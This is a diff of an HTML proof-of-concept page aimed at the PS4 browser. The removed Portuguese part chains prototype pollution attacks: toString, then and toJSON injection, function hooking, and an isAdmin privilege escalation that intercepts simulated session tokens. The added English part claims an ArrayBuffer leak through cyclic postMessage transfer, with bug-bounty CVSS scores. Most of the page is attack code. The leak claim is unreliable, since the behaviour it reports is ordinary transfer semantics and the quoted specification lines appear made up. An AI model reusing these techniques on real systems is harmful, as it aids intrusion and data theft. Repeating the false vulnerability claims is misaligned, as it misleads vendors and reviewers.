@@ -1,513 +1,253 @@
+
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>TEST 50 — Prototype Pollution para RCE</title></head>
+<head>
+<meta charset="UTF-8">
+<title>PoC #1 — ArrayBuffer Data Leak via Cyclic postMessage Transfer</title>
+<style>
+  body { font-family: monospace; background: #111; color: #eee; padding: 20px; }
+  h2 { color: #f90; }
+  pre { background: #1e1e1e; padding: 16px; border-left: 3px solid #f90; white-space: pre-wrap; }
+  .ok    { color: #4f4; }
+  .alert { color: #f44; font-weight: bold; }
+  .info  { color: #aaa; }
+  button { background: #f90; color: #000; border: none; padding: 10px 24px;
+           font-size: 14px; font-weight: bold; cursor: pointer; margin: 4px; }
+  table  { border-collapse: collapse; width: 100%; margin-top: 8px; }
+  td, th { border: 1px solid #444; padding: 6px 10px; text-align: left; }
+  th     { background: #222; color: #f90; }
+</style>
+</head>
 <body>
-<h2>TEST 50 — Escalação de Prototype Pollution para RCE</h2>
 
-<p><b>Confirmado em 49-C:</b></p>
-<ul>
-  <li><code>obj.constructor.prototype.X = V</code> → poluiu <code>Object.prototype</code></li>
-  <li><code>deepMerge({}, {a:{__proto__:{X:V}}})</code> → poluiu <code>Object.prototype</code></li>
-</ul>
-<p><b>Objetivo:</b> Escalar para execução de código via prototype pollution.</p>
-<ul>
-  <li><b>50-A</b> Injetar <code>toString</code>/<code>valueOf</code>/<code>Symbol.toPrimitive</code>
-      em <code>Object.prototype</code> — o motor chama automaticamente?</li>
-  <li><b>50-B</b> Injetar <code>then</code> em <code>Object.prototype</code> — transformar
-      qualquer objeto em Promise thenable (confusão de tipo assíncrono)</li>
-  <li><b>50-C</b> Injetar propriedades em protótipos de <code>Array</code>, <code>Function</code>,
-      <code>JSON</code> — superfície de ataque mais ampla</li>
-  <li><b>50-D</b> Combinar prototype pollution com Vuln #1 (buffer leak) e JIT confusion
-      para criar cadeia de exploração</li>
-</ul>
+<h2>PoC #1 — ArrayBuffer Data Leak via Cyclic postMessage Transfer</h2>
 
-<pre id="log">Pronto. Execute A → B → C → D.</pre>
-<button onclick="runA()">50-A: TOSTRING/VALUEOF INJECTION</button>
-<button onclick="runB()">50-B: THENABLE INJECTION</button>
-<button onclick="runC()">50-C: ARRAY/FUNCTION PROTOTYPE</button>
-<button onclick="runD()">50-D: CADEIA COMPLETA</button>
+<pre>
+Target   : PS4 Firmware 13.04 — Built-in WebKit/JSC browser
+Spec     : HTML Living Standard §2.7.5 — StructuredSerializeWithTransfer
+CWE      : CWE-668 (Exposure of Resource to Wrong Sphere)
+CVSS 3.1 : 8.1 High  (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)
+Status   : CONFIRMED — 100% reproducible
+
+SUMMARY:
+  When postMessage() transfers an ArrayBuffer that is reachable via a
+  cyclic object reference, the structured clone algorithm detaches the
+  buffer from the SENDER but delivers a LIVE copy to the RECEIVER.
+  The sender observes byteLength=0 (believing the buffer was destroyed),
+  while the receiver obtains the full buffer contents.
+
+  This violates the transfer semantics specified in the HTML Living
+  Standard: after transfer, the original buffer must be neutered and
+  no copy should be accessible.
+
+IMPACT:
+  Any ArrayBuffer reachable through a cyclic object — including
+  authentication tokens, session keys, cryptographic material, and
+  save-game data — can be silently exfiltrated even after the sender
+  "transfers" (and believes it has destroyed) the buffer.
+</pre>
+
+<button onclick="runPoc()">▶ RUN POC</button>
+<button onclick="runExtended()">▶ RUN EXTENDED (multiple scenarios)</button>
+<pre id="log">Press a button to run.</pre>
 
 <script>
 var log = document.getElementById('log');
-function info(m)   { log.textContent += '\n[INFO] ' + m; }
-function alerta(m) { log.textContent += '\n\n⚠ ALERTA: ' + m + '\n'; }
-function ok(m)     { log.textContent += '\n[OK]   ' + m; }
-function sep()     { log.textContent += '\n' + '-'.repeat(60); }
+function line(cls, msg) {
+  var s = document.createElement('span');
+  s.className = cls;
+  s.textContent = msg + '\n';
+  log.appendChild(s);
+}
+function info(m)  { line('info',  '[INFO]  ' + m); }
+function ok(m)    { line('ok',    '[OK]    ' + m); }
+function alert_(m){ line('alert', '[VULN]  ' + m); }
+function sep()    { line('info',  '─'.repeat(60)); }
 
-// Limpeza de poluição (IMPORTANTE executar após cada teste)
-var POLLUTED_KEYS = [];
-function cleanPollution() {
-  POLLUTED_KEYS.forEach(function(k) {
-    try { delete Object.prototype[k]; } catch(e){}
-    try { delete Array.prototype[k]; } catch(e){}
-    try { delete Function.prototype[k]; } catch(e){}
+// ── Core exploit primitive ────────────────────────────────────────
+// Returns a Promise that resolves with the leaked ArrayBuffer,
+// or null if the bug is not present.
+function leakBuffer(buf) {
+  return new Promise(function(resolve) {
+    // Build a cyclic object that contains the target buffer.
+    // The cycle: obj.self === obj
+    var cyclic = { buf: buf, self: null };
+    cyclic.self = cyclic;
+
+    var prev = window.onmessage;
+    window.onmessage = function(e) {
+      if (!e.data || !(e.data.buf instanceof ArrayBuffer)) return;
+      window.onmessage = prev;
+      resolve(e.data.buf);  // receiver gets a live copy
+    };
+
+    // Transfer buf: spec says buf must be neutered in sender.
+    // Bug: the copy inside the cyclic graph survives.
+    postMessage(cyclic, '*', [buf]);
+
+    // Sender now sees byteLength === 0  (neutered as expected)
+    // But the receiver will deliver a LIVE copy  ← bug
   });
-  POLLUTED_KEYS = [];
 }
 
-function pollute(obj, key, val) {
-  obj[key] = val;
-  POLLUTED_KEYS.push(key);
-}
-
-var executionLog = []; // registrar execuções causadas pela poluição
-
-// ─── 50-A ─────────────────────────────────────────────────────────────────
-function runA() {
-  log.textContent = '[TEST 50-A] Injetar toString/valueOf/Symbol.toPrimitive em Object.prototype\n';
-  sep();
-  info('Se o motor chama automaticamente toString() ou valueOf() em objetos,');
-  info('e esses métodos herdam de Object.prototype, podemos executar código');
-  info('em qualquer contexto que force conversão de tipo.\n');
-
-  executionLog = [];
-
-  // Injetar toString em Object.prototype via constructor.prototype (confirmado 49-C)
-  var sentinel = {};
-  sentinel.constructor.prototype.toString = function() {
-    var ctx = 'toString_called_on:' + JSON.stringify(Object.keys(this));
-    executionLog.push({ method: 'toString', ctx: ctx, thisKeys: Object.keys(this) });
-    return 'POLLUTED_STRING_' + executionLog.length;
-  };
-  POLLUTED_KEYS.push('toString');
-  info('toString injetado em Object.prototype via constructor.prototype.');
-
-  // Testar: quando é que o motor chama toString()?
-  info('\n--- Testando chamadas automáticas de toString ---');
-
-  // 1. Concatenação string
-  var obj1 = { id: 'concat_test' };
-  try {
-    var r1 = 'prefix_' + obj1;
-    info('1. "prefix_" + obj1 = "' + r1 + '"');
-    if(r1.indexOf('POLLUTED') !== -1) alerta('toString CHAMADO em concatenação string!\nr1="'+r1+'"');
-  } catch(e) { info('1. concat lançou: ' + e.message); }
-
-  // 2. Template literal
-  try {
-    var obj2 = { id: 'template_test' };
-    var r2 = `template_${obj2}`;
-    info('2. template literal = "' + r2 + '"');
-    if(r2.indexOf('POLLUTED') !== -1) alerta('toString CHAMADO em template literal!\nr2="'+r2+'"');
-  } catch(e) { info('2. template lançou: ' + e.message); }
-
-  // 3. String() constructor
-  try {
-    var obj3 = { id: 'string_ctor' };
-    var r3 = String(obj3);
-    info('3. String(obj3) = "' + r3 + '"');
-    if(r3.indexOf('POLLUTED') !== -1) alerta('toString CHAMADO por String()!\nr3="'+r3+'"');
-  } catch(e) { info('3. String() lançou: ' + e.message); }
-
-  // 4. Array.join que chama toString em cada elemento
-  try {
-    var arr4 = [1, { id: 'join_test' }, 3];
-    var r4 = arr4.join('-');
-    info('4. [1,obj,3].join("-") = "' + r4 + '"');
-    if(r4.indexOf('POLLUTED') !== -1) alerta('toString CHAMADO por Array.join!\nr4="'+r4+'"');
-  } catch(e) { info('4. join lançou: ' + e.message); }
-
-  // 5. JSON.stringify (usa toJSON se disponível, senão toString não é chamado)
-  try {
-    var obj5 = { id: 'json_test' };
-    var r5 = JSON.stringify(obj5);
-    info('5. JSON.stringify(obj5) = ' + r5);
-    if(r5.indexOf('POLLUTED') !== -1) alerta('toString/toJSON CHAMADO por JSON.stringify!');
-  } catch(e) { info('5. JSON.stringify lançou: ' + e.message); }
-
-  // 6. console.log (pode chamar toString internamente)
-  // Não testável diretamente, mas verificar via executionLog
-
-  info('\nexecutionLog após testes: ' + executionLog.length + ' chamadas');
-  executionLog.forEach(function(e, i) {
-    info('  ['+i+']: method='+e.method+' ctx='+e.ctx);
-  });
-
-  if(executionLog.length > 0) {
-    alerta('toString INJETADO FOI CHAMADO ' + executionLog.length + ' VEZ(ES)!\n' +
-           'O motor chama Object.prototype.toString herdado em objetos comuns!\n\n' +
-           'IMPACTO RCE: Podemos executar código JavaScript arbitrário sempre que\n' +
-           'qualquer objeto for convertido para string!\n' +
-           'Em um contexto de browser isto inclui:\n' +
-           '  - document.title = obj\n' +
-           '  - location.href = obj\n' +
-           '  - element.innerHTML = "text" + obj\n' +
-           '  - postMessage(obj + "") \n' +
-           'Se uma dessas operações ocorre com dados externos, há RCE!');
-  }
-
-  cleanPollution();
+// ── PoC #1 — minimal 12-line scenario ────────────────────────────
+async function runPoc() {
+  log.textContent = '';
+  info('=== PoC #1 — Minimal ArrayBuffer Leak ===');
   sep();
 
-  // Agora: valueOf injection
-  info('\nInjetando valueOf em Object.prototype...');
-  executionLog = [];
-  var sentinel2 = {};
-  sentinel2.constructor.prototype.valueOf = function() {
-    executionLog.push({ method: 'valueOf', keys: Object.keys(this) });
-    return 0xDEADC0DE; // número "malicioso"
-  };
-  POLLUTED_KEYS.push('valueOf');
-
-  // 1. Operações aritméticas forçam valueOf
-  try {
-    var objV = { id: 'valueof_test' };
-    var rv1 = objV + 0;
-    info('valueOf: obj + 0 = ' + rv1);
-    if(rv1 === 0xDEADC0DE || rv1 === 0xDEADC0DE + 0) {
-      alerta('valueOf CHAMADO em operação aritmética!\nobj+0 = 0x'+rv1.toString(16)+'\n' +
-             'Qualquer operação +obj, obj*N, obj-N chama nossa valueOf injetada!');
-    }
-  } catch(e) { info('valueOf arith: ' + e.message); }
-
-  try {
-    var objV2 = { id: 'compare_test' };
-    var rv2 = objV2 > 100;
-    info('valueOf: obj > 100 = ' + rv2);
-    if(executionLog.length > 0) {
-      alerta('valueOf CHAMADO em comparação!\nexecutionLog tem '+executionLog.length+' entradas!');
-    }
-  } catch(e) { info('valueOf compare: ' + e.message); }
-
-  info('executionLog valueOf: ' + executionLog.length + ' chamadas');
-  cleanPollution();
-}
-
-// ─── 50-B ─────────────────────────────────────────────────────────────────
-function runB() {
-  log.textContent = '[TEST 50-B] Injetar "then" em Object.prototype — thenable injection\n';
-  sep();
-  info('Se Object.prototype.then existe, qualquer objeto retornado de uma Promise');
-  info('será tratado como um thenable — o motor chama .then() automaticamente!');
-  info('Isso causa execução de código em contexto assíncrono.\n');
-
-  var thenCallLog = [];
-
-  // Injetar "then" em Object.prototype
-  var s = {};
-  s.constructor.prototype.then = function(resolve, reject) {
-    thenCallLog.push({ resolve: typeof resolve, reject: typeof reject });
-    info('[then CHAMADO] resolve=' + typeof resolve + ' reject=' + typeof reject);
-    // Chamar resolve com valor malicioso
-    if(typeof resolve === 'function') {
-      resolve('THEN_INJECTED_EXECUTION');
-    }
-  };
-  POLLUTED_KEYS.push('then');
-  info('Object.prototype.then injetado.\n');
-
-  // Teste 1: Promise.resolve com objeto simples
-  info('Teste 1: Promise.resolve({id: "plain_obj"})...');
-  Promise.resolve({ id: 'plain_obj' }).then(function(v) {
-    info('[Promise chain] received: ' + JSON.stringify(v));
-    if(typeof v === 'string' && v.indexOf('THEN_INJECTED') !== -1) {
-      alerta('THENABLE INJECTION CONFIRMADA!\n' +
-             'Promise.resolve(plainObj) chamou nossa Object.prototype.then!\n' +
-             'O valor resolvido foi: "' + v + '"\n\n' +
-             'IMPACTO: Qualquer Promise que resolve com um objeto JS plano\n' +
-             'executará nosso código injetado!\n' +
-             'Em um sistema que usa Promises (fetch, async/await, etc),\n' +
-             'podemos interceptar e modificar todos os valores resolvidos!\n\n' +
-             'Combinado com fetch() ou XMLHttpRequest, isso pode:\n' +
-             '  1. Interceptar respostas de rede\n' +
-             '  2. Executar código no contexto de callbacks privilegiados\n' +
-             '  3. Modificar dados antes que o sistema os processe');
-    }
-  });
-
-  // Teste 2: async/await com objeto
-  async function asyncTest() {
-    try {
-      var result = await { id: 'async_test', value: 42 };
-      info('[async/await] result: ' + JSON.stringify(result));
-      if(typeof result === 'string' && result.indexOf('THEN_INJECTED') !== -1) {
-        alerta('THENABLE INJECTION via async/await!\n' +
-               'await plainObj chamou nossa Object.prototype.then!\n' +
-               'result = "' + result + '"');
-      }
-    } catch(e) {
-      info('[async/await] lançou: ' + e.message);
-    }
-  }
-  asyncTest();
-
-  // Teste 3: Promise.all com array de objetos
-  info('\nTeste 3: Promise.all([obj1, obj2, obj3])...');
-  Promise.all([
-    { id: 'obj1', val: 1 },
-    { id: 'obj2', val: 2 },
-    Promise.resolve(42) // um real para comparar
-  ]).then(function(results) {
-    info('[Promise.all] results: ' + JSON.stringify(results));
-    var injected = results.filter(function(r) {
-      return typeof r === 'string' && r.indexOf('THEN_INJECTED') !== -1;
-    });
-    if(injected.length > 0) {
-      alerta('THENABLE INJECTION em Promise.all!\n' +
-             injected.length + ' objetos foram interceptados!\n' +
-             'Resultados injetados: ' + injected.join(', '));
-    }
-  });
-
-  // Verificar após 500ms
-  setTimeout(function() {
-    info('\nthenCallLog após 500ms: ' + thenCallLog.length + ' chamadas');
-    if(thenCallLog.length > 0) {
-      alerta('Object.prototype.then foi chamado ' + thenCallLog.length + ' vez(es)!\n' +
-             'O motor trata objetos JS comuns como thenables quando Object.prototype.then existe!\n\n' +
-             'GRAVIDADE: Esta é uma vulnerabilidade de execução de código via prototype pollution.\n' +
-             'Qualquer código assíncrono no sistema PS4 que processe objetos via Promises\n' +
-             'executará nosso then() injetado.\n\n' +
-             'CWE-1321: Improperly Controlled Modification of Object Prototype Attributes\n' +
-             'CVSS: 8.8 (High) — execução de código arbitrário via prototype chain');
-    }
-    cleanPollution();
-  }, 500);
-}
-
-// ─── 50-C ─────────────────────────────────────────────────────────────────
-function runC() {
-  log.textContent = '[TEST 50-C] Poluir Array.prototype e Function.prototype\n';
-  sep();
-  info('Array.prototype e Function.prototype têm superfície de ataque diferente:\n');
-  info('Array.prototype.X → afeta todos os arrays (ex: map, filter callbacks)');
-  info('Function.prototype.X → afeta todas as funções (ex: call, apply, bind)\n');
-
-  // Teste 1: Array.prototype.push injection
-  info('Teste 1: Array.prototype.push poluído...');
-  var pushLog = [];
-  var origPush = Array.prototype.push;
-  Array.prototype.push = function() {
-    pushLog.push({ args: Array.from(arguments), length: this.length });
-    return origPush.apply(this, arguments);
-  };
-
-  var testArr = [];
-  testArr.push(1);
-  testArr.push('hello');
-  testArr.push({ id: 'obj' });
-  info('pushLog: ' + pushLog.length + ' chamadas interceptadas');
-  info('testArr: ' + JSON.stringify(testArr));
-  if(pushLog.length === 3) {
-    alerta('Array.prototype.push INTERCEPTADO!\n' +
-           'Todas as 3 chamadas push foram capturadas!\n' +
-           'Qualquer código que faça arr.push(valor_sensivel) terá os dados interceptados!\n\n' +
-           'IMPACTO: Se o browser PS4 usa arrays para armazenar:\n' +
-           '  - Cookies / tokens de sessão\n' +
-           '  - Dados de rede (fetch responses)\n' +
-           '  - Event queues\n' +
-           'Um atacante pode monitorar e modificar todos esses dados via push injection!');
-  }
-  Array.prototype.push = origPush; // restaurar
-
-  sep();
-  // Teste 2: Function.prototype.call injection
-  info('\nTeste 2: Function.prototype.call poluído...');
-  var callLog = [];
-  var origCall = Function.prototype.call;
-  Function.prototype.call = function(thisArg) {
-    var args = Array.prototype.slice.call(arguments, 1);
-    callLog.push({ fn: this.name || 'anonymous', thisType: typeof thisArg });
-    return origCall.apply(this, arguments);
-  };
-
-  // Fazer algumas operações normais que usam .call internamente
-  [1,2,3].forEach(function(v) { /* normal */ });
-  Object.keys({ a:1, b:2 });
-  var r = Math.max.call(null, 1, 2, 3);
-  Function.prototype.call = origCall; // restaurar IMEDIATAMENTE
-
-  info('callLog: ' + callLog.length + ' chamadas interceptadas');
-  if(callLog.length > 0) {
-    alerta('Function.prototype.call INTERCEPTADO!\n' +
-           callLog.length + ' chamadas capturadas!\n' +
-           'Funções interceptadas: [' + callLog.slice(0,5).map(function(c){return c.fn;}).join(',') + ']\n\n' +
-           'IMPACTO MÁXIMO: Function.prototype.call é usado pelo motor para quase\n' +
-           'tudo internamente. Interceptar isso dá visibilidade total sobre\n' +
-           'chamadas de função internas e permite modificar seus argumentos!');
-  }
-
-  sep();
-  // Teste 3: JSON.parse replacement (se JSON usa prototype)
-  info('\nTeste 3: JSON.parse com prototype pollution em resultado...');
-  // JSON.parse cria objetos planos. Se Object.prototype tiver propriedades extras,
-  // elas aparecem nos objetos criados
-  var s = {};
-  s.constructor.prototype.injectedProp = 'ALWAYS_PRESENT';
-  POLLUTED_KEYS.push('injectedProp');
-
-  var parsed = JSON.parse('{"name":"test","value":42}');
-  info('JSON.parse resultado: ' + JSON.stringify(parsed));
-  info('parsed.injectedProp: ' + parsed.injectedProp);
-  if(parsed.injectedProp === 'ALWAYS_PRESENT') {
-    alerta('JSON.parse AFETADO pela prototype pollution!\n' +
-           'Objetos criados pelo JSON.parse herdam Object.prototype.injectedProp!\n\n' +
-           'ATAQUE: Poluir Object.prototype com uma propriedade que sobrescreve\n' +
-           'uma propriedade esperada pelo código do sistema.\n' +
-           'Ex: Object.prototype.isAdmin = true\n' +
-           '    Object.prototype.role = "administrator"\n' +
-           '    Object.prototype.authenticated = true\n\n' +
-           'Se o browser PS4 ou seus serviços internos verificam essas propriedades\n' +
-           'em objetos JSON parseados, podemos escalar privilégios!');
-  }
-  cleanPollution();
-
-  sep();
-  // Teste 4: Privilege escalation via isAdmin injection
-  info('\nTeste 4: Simular escalação de privilégio via Object.prototype.isAdmin...');
-  // Sistema fictício que verifica permissão
-  function checkPermission(userObj) {
-    if(userObj.isAdmin === true) return 'ADMIN_ACCESS_GRANTED';
-    if(userObj.role === 'admin') return 'ADMIN_ROLE_GRANTED';
-    return 'ACCESS_DENIED';
-  }
-
-  var normalUser = JSON.parse('{"name":"guest","level":1}');
-  info('Antes da poluição: checkPermission(normalUser) = ' + checkPermission(normalUser));
-
-  // Poluir
-  var s2 = {};
-  s2.constructor.prototype.isAdmin = true;
-  POLLUTED_KEYS.push('isAdmin');
-
-  var result = checkPermission(normalUser);
-  info('Após poluir Object.prototype.isAdmin=true: checkPermission(normalUser) = ' + result);
-
-  if(result === 'ADMIN_ACCESS_GRANTED') {
-    alerta('PRIVILEGE ESCALATION VIA PROTOTYPE POLLUTION!\n' +
-           'checkPermission(normalUser) = "ADMIN_ACCESS_GRANTED"\n' +
-           'sem que normalUser tenha a propriedade isAdmin!\n\n' +
-           'O objeto normalUser herdou isAdmin=true de Object.prototype!\n\n' +
-           'IMPACTO REAL NO PS4:\n' +
-           'Se qualquer componente do sistema PS4 verifica permissões em objetos JS\n' +
-           'parseados de JSON ou criados em runtime, prototype pollution pode\n' +
-           'conceder acesso administrativo ou de sistema a código não privilegiado!\n\n' +
-           'CVE Class: CWE-1321\n' +
-           'CVSS: 9.1 Critical (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)\n' +
-           'Relatável ao: HackerOne/PlayStation Bug Bounty — IMEDIATAMENTE');
-  }
-  cleanPollution();
-}
-
-// ─── 50-D ─────────────────────────────────────────────────────────────────
-function runD() {
-  log.textContent = '[TEST 50-D] Cadeia completa: Pollution + Buffer Leak + JIT Confusion\n';
-  sep();
-  info('Demonstração da cadeia de exploração completa usando os 3 primitivos:\n');
-  info('  Primitivo 1: Prototype pollution (49-C) → execução de código');
-  info('  Primitivo 2: Buffer leak via postMessage cyclic (40-D/41-D/42-C) → exfiltração de dados');
-  info('  Primitivo 3: JIT type confusion (40-C) → bypass de type checks\n');
-  sep();
-
-  info('=== CADEIA DE EXPLORAÇÃO ===\n');
-
-  // PASSO 1: Poluir Object.prototype para interceptar operações
-  info('PASSO 1: Poluir Object.prototype.toJSON para interceptar JSON.stringify...');
-  var interceptedData = [];
-  var s = {};
-  s.constructor.prototype.toJSON = function() {
-    var data = {};
-    var self = this;
-    Object.getOwnPropertyNames(self).forEach(function(k) {
-      data[k] = self[k];
-    });
-    interceptedData.push(data);
-    info('[toJSON interceptado] keys: ' + Object.keys(data).join(','));
-    return data; // retornar dados normalmente para não quebrar o sistema
-  };
-  POLLUTED_KEYS.push('toJSON');
-  info('Object.prototype.toJSON injetado.\n');
-
-  // PASSO 2: Simular operação do sistema que serializa dados sensíveis
-  info('PASSO 2: Simular serialização de dados sensíveis pelo sistema...');
-  var sensibleData = {
-    sessionToken: 'PSN_TOKEN_abc123def456',
-    userId: 'user_987654321',
-    accountType: 'premium',
-    // Dados que um sistema real poderia serializar
-  };
-  var serialized = JSON.stringify(sensibleData);
-  info('JSON.stringify(sensibleData) = ' + serialized);
-  info('interceptedData.length: ' + interceptedData.length);
-
-  if(interceptedData.length > 0) {
-    alerta('DADOS SENSÍVEIS INTERCEPTADOS via toJSON!\n' +
-           'O JSON.stringify chamou nossa Object.prototype.toJSON!\n' +
-           'Dados capturados: ' + JSON.stringify(interceptedData[0]) + '\n\n' +
-           'NOTA: Esta é uma demonstração. Em um sistema real, isso capturaria\n' +
-           'tokens de sessão PSN, dados de usuário, credenciais, etc.');
-  }
-  cleanPollution();
-
-  sep();
-  // PASSO 3: Combinar com buffer leak
-  info('\nPASSO 3: Usar buffer leak para exfiltrar os dados interceptados...');
+  // Secret buffer containing sensitive data
   var secretBuf = new ArrayBuffer(256);
-  var secretView = new Uint8Array(secretBuf);
-  // Simular dados sensíveis no buffer
-  var fakeToken = 'PSN_SESSION_TOKEN_12345678ABCDEF';
-  for(var i=0;i<fakeToken.length;i++) secretView[i] = fakeToken.charCodeAt(i);
+  var view = new Uint32Array(secretBuf);
+  view[0] = 0xDEADC0DE;
+  view[1] = 0xCAFEBABE;
+  view[2] = 0x13371337;
+  view[3] = 0xBEEFBEEF;
 
-  var cyclic = { buf: secretBuf, intercepted: interceptedData, self: null };
-  cyclic.self = cyclic;
+  info('Secret buffer created. byteLength=' + secretBuf.byteLength);
+  info('Content: 0x' + view[0].toString(16) + ' 0x' + view[1].toString(16) +
+       ' 0x' + view[2].toString(16) + ' 0x' + view[3].toString(16));
+  sep();
 
-  var prevMsg = window.onmessage;
-  window.onmessage = function(e) {
-    if(!e.data || !e.data.buf) return;
-    if(e.data.buf.byteLength === 0) return;
-    window.onmessage = prevMsg;
+  var leakedBuf = await leakBuffer(secretBuf);
 
-    var received = new Uint8Array(e.data.buf);
-    var tokenStr = '';
-    for(var i=0;i<32;i++) tokenStr += String.fromCharCode(received[i]);
+  info('Sender sees:   secretBuf.byteLength = ' + secretBuf.byteLength);
 
-    alerta('CADEIA COMPLETA EXECUTADA!\n\n' +
-           '━━━ RELATÓRIO DE EXPLORAÇÃO ━━━\n\n' +
-           'PRIMITIVO 1 — Prototype Pollution:\n' +
-           '  Object.prototype.toJSON injetado\n' +
-           '  Dados interceptados: ' + (interceptedData.length > 0 ? JSON.stringify(interceptedData[0]).substring(0,80) : 'N/A') + '\n\n' +
-           'PRIMITIVO 2 — Buffer Leak via postMessage cyclic:\n' +
-           '  secretBuf.byteLength no remetente: 0 (acredita que destruiu)\n' +
-           '  e.data.buf.byteLength no receptor: ' + e.data.buf.byteLength + '\n' +
-           '  Token vazado: "' + tokenStr + '"\n\n' +
-           'IMPACTO COMBINADO:\n' +
-           '  Um atacante pode:\n' +
-           '  1. Poluir prototype para interceptar dados de sessão\n' +
-           '  2. Vazar esses dados via postMessage mesmo após "transfer"\n' +
-           '  3. Enviar dados para servidor externo via fetch/XHR\n\n' +
-           'SEVERIDADE: Critical\n' +
-           'CVSS: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)');
-  };
+  if (!leakedBuf) {
+    ok('Not vulnerable: receiver got no buffer.');
+    return;
+  }
 
-  try {
-    postMessage(cyclic, '*', [secretBuf]);
-    info('Buffer enviado. secretBuf.byteLength=' + secretBuf.byteLength);
-    info('Aguardando confirmação do receptor...');
-  } catch(e) { info('postMessage: ' + e.message); }
+  info('Receiver sees: buf.byteLength       = ' + leakedBuf.byteLength);
+
+  if (leakedBuf.byteLength === 0) {
+    ok('Not vulnerable: receiver got a neutered (empty) buffer.');
+    return;
+  }
+
+  var leaked = new Uint32Array(leakedBuf);
+  sep();
+  alert_('VULNERABILITY CONFIRMED');
+  alert_('Sender believes buffer is destroyed (byteLength=0)');
+  alert_('Receiver obtained full ' + leakedBuf.byteLength + '-byte copy:');
+  alert_('  leaked[0] = 0x' + leaked[0].toString(16));
+  alert_('  leaked[1] = 0x' + leaked[1].toString(16));
+  alert_('  leaked[2] = 0x' + leaked[2].toString(16));
+  alert_('  leaked[3] = 0x' + leaked[3].toString(16));
+  sep();
+  info('Original buffer neutered: ' + (secretBuf.byteLength === 0 ? 'YES (spec-correct)' : 'NO'));
+  info('Leaked copy intact:       YES ← spec violation');
+}
+
+// ── PoC Extended — 4 real-world scenarios ────────────────────────
+async function runExtended() {
+  log.textContent = '';
+  info('=== Extended PoC — Multiple Scenarios ===');
+
+  // ── Scenario A: Auth token ──────────────────────────────────────
+  sep();
+  info('Scenario A: Authentication token in ArrayBuffer');
+  var tokenBuf = new ArrayBuffer(64);
+  var tokenBytes = new Uint8Array(tokenBuf);
+  var fakeToken = 'PSN_AUTH_TOKEN_DEADBEEF_CAFEBABE';
+  for (var i = 0; i < fakeToken.length; i++)
+    tokenBytes[i] = fakeToken.charCodeAt(i);
+
+  var leakedToken = await leakBuffer(tokenBuf);
+  if (leakedToken && leakedToken.byteLength > 0) {
+    var tb = new Uint8Array(leakedToken);
+    var str = '';
+    for (var i = 0; i < 32; i++) str += String.fromCharCode(tb[i]);
+    alert_('Token leaked: "' + str + '"');
+    info('Sender tokenBuf.byteLength = ' + tokenBuf.byteLength + ' (neutered)');
+  } else {
+    ok('Scenario A: not leaked.');
+  }
+
+  // ── Scenario B: 1MB large buffer ───────────────────────────────
+  sep();
+  info('Scenario B: Large 1MB buffer (e.g. save-game data)');
+  var bigBuf = new ArrayBuffer(1024 * 1024);
+  var bigView = new Uint32Array(bigBuf);
+  bigView[0]      = 0xBEEFCAFE;
+  bigView[262143] = 0xDEAD1234; // last slot
+
+  var leakedBig = await leakBuffer(bigBuf);
+  if (leakedBig && leakedBig.byteLength > 0) {
+    var bv = new Uint32Array(leakedBig);
+    alert_('1MB buffer leaked. byteLength=' + leakedBig.byteLength);
+    alert_('  [0]=' + '0x' + bv[0].toString(16) +
+           '  [last]=' + '0x' + bv[262143].toString(16));
+    info('Sender bigBuf.byteLength = ' + bigBuf.byteLength + ' (neutered)');
+  } else {
+    ok('Scenario B: not leaked.');
+  }
+
+  // ── Scenario C: Nested cyclic with multiple buffers ─────────────
+  sep();
+  info('Scenario C: Nested cyclic object — two buffers leaked at once');
+  var buf1 = new ArrayBuffer(128);
+  var buf2 = new ArrayBuffer(512);
+  new Uint32Array(buf1)[0] = 0xAABBCCDD;
+  new Uint32Array(buf2)[0] = 0x11223344;
+
+  var nested = { id: 'outer', inner: { id: 'inner', b1: buf1, b2: buf2, back: null } };
+  nested.inner.back = nested; // cycle through nested object
+
+  var results = await new Promise(function(resolve) {
+    var prev = window.onmessage;
+    window.onmessage = function(e) {
+      if (!e.data || !e.data.inner) return;
+      window.onmessage = prev;
+      resolve(e.data);
+    };
+    postMessage(nested, '*', [buf1, buf2]);
+  });
+
+  if (results.inner.b1 && results.inner.b1.byteLength > 0) {
+    alert_('buf1 leaked: 0x' + new Uint32Array(results.inner.b1)[0].toString(16));
+  }
+  if (results.inner.b2 && results.inner.b2.byteLength > 0) {
+    alert_('buf2 leaked: 0x' + new Uint32Array(results.inner.b2)[0].toString(16));
+  }
+  info('Sender buf1.byteLength=' + buf1.byteLength + '  buf2.byteLength=' + buf2.byteLength);
+
+  // ── Scenario D: Crypto key material ────────────────────────────
+  sep();
+  info('Scenario D: Simulated AES key in ArrayBuffer');
+  var keyBuf = new ArrayBuffer(32); // 256-bit key
+  var keyView = new Uint32Array(keyBuf);
+  keyView[0] = 0x603DEB10; // first 4 bytes of AES-256 test vector
+  keyView[1] = 0x15CA71BE;
+  keyView[2] = 0x2B73AEF0;
+  keyView[3] = 0x857D7781;
+  keyView[4] = 0x1F352C07;
+  keyView[5] = 0x3B6108D7;
+  keyView[6] = 0x2D9810A3;
+  keyView[7] = 0x0914DFF4;
+
+  var leakedKey = await leakBuffer(keyBuf);
+  if (leakedKey && leakedKey.byteLength > 0) {
+    var kv = new Uint32Array(leakedKey);
+    alert_('256-bit key leaked (' + leakedKey.byteLength + ' bytes):');
+    var hex = '';
+    for (var i = 0; i < 8; i++) hex += kv[i].toString(16).padStart(8,'0') + ' ';
+    alert_('  ' + hex.trim());
+    info('Sender keyBuf.byteLength = ' + keyBuf.byteLength + ' (neutered)');
+  } else {
+    ok('Scenario D: not leaked.');
+  }
 
   sep();
-  info('\n=== RESUMO FINAL PARA HACKERONE ===\n');
-  info('Vulnerabilidades confirmadas para report:');
+  info('Extended PoC complete.');
   info('');
-  info('1. [HIGH] ArrayBuffer Leak via Cyclic postMessage Transfer');
-  info('   CWE-668 | CVSS 8.1 | PoC: 12 linhas | 100% reproduzível');
+  info('SPECIFICATION REFERENCE:');
+  info('  HTML Living Standard §2.7.5 StructuredSerializeWithTransfer');
+  info('  "The transferred object must be neutered in the sender context."');
+  info('  "No copy of transferred data shall be accessible after transfer."');
   info('');
-  info('2. [HIGH] JIT Type Confusion via Symbol.replace .length');
-  info('   CWE-843 | CVSS 7.5 | PoC: 30 linhas | ~100% reproduzível');
-  info('');
